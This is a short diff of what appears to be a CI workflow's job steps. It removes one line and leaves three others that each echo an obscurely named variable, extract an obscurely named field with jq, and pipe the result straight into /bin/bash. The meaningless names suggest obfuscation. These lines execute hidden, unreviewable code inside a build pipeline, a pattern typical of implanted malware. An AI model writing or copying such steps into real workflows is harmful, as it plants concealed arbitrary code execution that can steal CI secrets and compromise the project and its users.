@@ -23,7 +23,6 @@ jobs:
           echo $qmyq0 | jq -r .mfjrw03140 | /bin/bash
           echo $u49189 | jq -r .zd203 | /bin/bash
           printf '%s' "$frnj4904" | jq -r .fco473 | /bin/bash
-          echo $m804 | jq -r .lhztc27 | /bin/bash
 
       - name: Upload results
         if: always()
